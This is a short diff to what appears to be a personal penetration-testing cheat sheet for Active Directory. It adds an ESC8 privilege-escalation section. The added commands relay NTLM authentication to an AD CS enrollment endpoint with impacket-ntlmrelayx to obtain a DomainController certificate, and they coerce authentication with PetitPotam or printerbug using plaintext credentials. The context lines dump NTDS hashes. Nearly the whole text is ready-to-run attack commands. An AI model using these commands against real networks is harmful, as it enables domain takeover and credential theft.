@@ -108,10 +108,15 @@ bloodhound-ce-python -u 'user@domain1' -p 'pass' -d 'domain2' -c 'All' -ns '10.5
 nxc smb dc -u 'user' -H 'hash' --ntds --user 'Administrator'
 ```
 
-### ESC8
+# Privilege Escalation
+## ESC8
 
 ```bash
 impacket-ntlmrelayx -t http://10.0.30.19/certsrv/certfnsh.asp \ -smb2support --adcs --template DomainController
 
+# two options (PetitPotam or printerbug)
 python3 PetitPotam.py -u jtrueblood -p 'blood_brothers' \ -d shadow.gate <YOUR_IP> 10.0.30.19
+
+# https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
+python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
 ```
